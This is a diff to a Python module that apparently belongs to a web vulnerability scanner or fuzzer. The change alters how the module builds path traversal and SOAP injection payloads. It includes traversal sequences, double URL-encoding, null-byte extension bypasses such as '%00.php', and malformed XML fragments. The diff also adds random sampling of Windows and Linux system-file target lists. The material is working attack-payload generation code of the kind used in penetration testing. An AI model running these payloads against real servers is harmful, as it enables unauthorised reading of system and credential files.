@@ -1,5 +1,7 @@
 import HTTPRequester
 import urllib
+import random
+
 payload_type = None
 pathtraversalaux_linux = 'TxtAux/LinuxPathTraversal.txt'
 pathtraversalaux_windows = 'TxtAux/WindowsPathTraversal.txt'
@@ -10,7 +12,7 @@ soap_inj_foo_closed = '<foo></bar>'
 soap_inj_comment = '<!--'
 soap_inj_close_comment = '<!--beasted!-->'
 ###################################
-pttestafter = ['%20', '...', '"""', "<<<>>>"]
+pttestafter = ['...', '"""', "<<<>>>"]
 pttestbefore = ['./././', 'gotya/../', 'gotya//....//', 'gotya\\\\....\\\\', 'gotya\\..\\..\\']
 ptaddition = '../../../../../../../../../../../../'
 nullbytes = ['%00.pdf', '%00.jpg', '%00.png', '%00.jpeg', '%00.mpeg', '%00.mp4', '%00.html', '%00.php', '%00.jsp', '%00.asp', '%00.js', '%00.cgi']
@@ -68,11 +70,12 @@ def soap_injection_payload_gen():
          soap_inj_close_comment.replace('<', lessthanutf16).replace('!', exclamationutf16).replace('-', hyphenutf16).replace('>', greaterthanutf16)])
 
 def path_traversal_payload_gen():
-    global paylist
+    global paylist, pttestafter, pttestbefore
 
     with open(pathtraversalaux_windows) as f:
         content = f.readlines()
     windows_files = [x.strip() for x in content]
+    windows_files = random.sample(windows_files, 10)
 
     additions = []
     for path in windows_files:
@@ -133,6 +136,7 @@ def path_traversal_payload_gen():
     with open(pathtraversalaux_linux) as f:
         content = f.readlines()
     linux_files = [x.strip() for x in content]
+    linux_files = random.sample(linux_files, 10)
 
     additions = []
     for path in linux_files:
@@ -190,4 +194,14 @@ def path_traversal_payload_gen():
     for lf in windows_files:
         linux_payloads.append(urllib.quote_plus(urllib.quote_plus(lf)))
 
-    paylist = [ptaddition, pttestafter, windows_payloads, linux_payloads]
+    k = 0
+    while k < len(pttestbefore):
+        pttestbefore[k] = urllib.quote_plus(pttestbefore[k])
+        k = k + 1
+
+    k = 0
+    while k < len(pttestafter):
+        pttestafter[k] = urllib.quote_plus(pttestafter[k])
+        k = k + 1
+
+    paylist = [pttestbefore, pttestafter, windows_payloads, linux_payloads]
